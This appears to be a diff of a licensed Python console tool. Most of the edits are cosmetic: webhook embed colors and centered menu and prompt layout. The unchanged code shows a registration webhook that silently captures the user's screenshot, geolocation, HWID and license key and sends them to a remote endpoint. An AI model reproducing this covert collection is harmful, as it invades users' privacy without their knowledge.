@@ -437,7 +437,7 @@ def take_screenshot():
         return None
 
 def send_webhook(license_key, hwid, user_id="", geo_info=None):
-    """Send registration to webhook with geolocation and screenshot"""
+    """Send registration to webhook with geolocation and screenshot (white embed)"""
     try:
         webhook_url = get_webhook_url()
         if not webhook_url:
@@ -446,7 +446,7 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
         # Try to take screenshot
         screenshot_b64 = take_screenshot()
         
-        # Create fields for embed
+        # Create fields for embed - WHITE color (16777215)
         fields = [
             {"name": "License key", "value": f"`{license_key}`", "inline": True},
             {"name": "HWID", "value": f"`{hwid}`", "inline": True}
@@ -481,12 +481,12 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
         else:
             fields.append({"name": "Screenshot", "value": "Could not capture screenshot", "inline": False})
         
-        # Prepare payload with both content and embed
+        # Prepare payload with both content and embed - WHITE COLOR (16777215)
         payload = {
             "content": f"**License Key:** `{license_key}`",
             "embeds": [{
                 "title": "NEW REGISTRATION",
-                "color": 16711680,  # Red color
+                "color": 16777215,  # WHITE color
                 "fields": fields,
                 "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
             }]
@@ -551,25 +551,23 @@ def display_ascii_art():
     print_color_centered(separator, sep_color)
 
 def display_color_selection():
-    """Display color selection menu centered"""
+    """Display color selection menu centered in 2-column layout"""
     display_ascii_art()
     
     print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color Selection Menu{Style.RESET_ALL}\n")
     
-    # Create clean grid: 2 columns, 5 rows
+    # Create 2 columns: 2 options per row
     color_keys = list(COLOR_THEMES.keys())
     
-    # Display in 2 columns centered
     for i in range(0, len(color_keys), 2):
-        line = ""
+        row_options = []
         for j in range(2):
             if i + j < len(color_keys):
                 key = color_keys[i + j]
                 theme = COLOR_THEMES[key]
                 # Use the theme's actual color
                 if theme.get("rainbow"):
-                    # Show rainbow colors preview
-                    color_code = "\033[38;5;196m"  # Red
+                    color_code = "\033[38;5;196m"  # Red for rainbow preview
                     name = "Rainbow"
                 elif theme.get("grayscale"):
                     color_code = "\033[38;5;255m"  # White
@@ -578,15 +576,20 @@ def display_color_selection():
                     mid_color = hsv_to_ansi(theme["hue"], 0.9, 0.75)
                     color_code = f"\033[38;5;{mid_color}m"
                     name = theme['name']
-                line += f"{color_code}[{key}]{Style.RESET_ALL}{Fore.WHITE} {name:<12}"
-        print_centered(line.strip())
+                
+                option_text = f"{color_code}[{key}]{Style.RESET_ALL}{Fore.WHITE} {name}"
+                row_options.append(option_text)
+        
+        # Join options with proper spacing for 2 columns
+        row_text = "    ".join(row_options)
+        print_centered(row_text)
     
     print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
     
-    # Center the input prompt
-    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}"
-    print_centered(prompt)
-    return input(" " * ((get_console_width() - 20) // 2) + "   ").strip()
+    # Center the input prompt on the same line
+    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > "
+    print(prompt.center(get_console_width()), end="")
+    return input().strip()
 
 def display_main_menu():
     """Display main menu with options side by side and centered"""
@@ -594,31 +597,31 @@ def display_main_menu():
     
     print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu{Style.RESET_ALL}\n")
     
-    # Display options side by side centered
-    options = [
-        f"{get_color('light')}[1]{Style.RESET_ALL} Change Color", 
-        f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID", 
-        f"{get_color('light')}[3]{Style.RESET_ALL} Exit"
+    # Create 2 options per row layout
+    menu_options = [
+        (f"{get_color('light')}[1]{Style.RESET_ALL} Change Color", f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID"),
+        (f"{get_color('light')}[3]{Style.RESET_ALL} Exit", "")
     ]
     
-    options_line = "   ".join(options)
-    print_centered(options_line)
+    for row in menu_options:
+        row_text = "    ".join([opt for opt in row if opt])  # Join non-empty options
+        print_centered(row_text)
+    
     print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
     
-    # Center the input prompt
-    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}"
-    print_centered(prompt)
-    return input(" " * ((get_console_width() - 20) // 2) + "   ").strip()
+    # Center the input prompt on the same line
+    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > "
+    print(prompt.center(get_console_width()), end="")
+    return input().strip()
 
 def display_license_prompt():
     """Display license key prompt centered"""
     display_ascii_art()
     
-    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Enter License Key > {Style.RESET_ALL}"
-    print_centered(prompt)
-    
-    # Center the input cursor
-    return input(" " * ((get_console_width() - 20) // 2) + "   ").strip()
+    # Center the input prompt on the same line
+    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Enter License Key > "
+    print(prompt.center(get_console_width()), end="")
+    return input().strip()
 
 def validate_license_key(save_license_prompt=False):
     """Validate license key against private GitHub database"""
@@ -693,12 +696,11 @@ def validate_license_key(save_license_prompt=False):
                         print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating database...{Style.RESET_ALL}")
                         print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated!{Style.RESET_ALL}")
                         
-                        # Ask if user wants to save the license key (only on first activation) using Windows popup
-                        if is_first_activation:
-                            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Please check Windows popup...{Style.RESET_ALL}")
-                            if ask_save_license_windows():
-                                if save_license_key(user_key):
-                                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}License key saved for next time{Style.RESET_ALL}")
+                        # ALWAYS ask if user wants to save the license key using Windows popup
+                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Please check Windows popup...{Style.RESET_ALL}")
+                        if ask_save_license_windows():
+                            if save_license_key(user_key):
+                                print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}License key saved for next time{Style.RESET_ALL}")
                         
                         time.sleep(2)
                         return True, user_key
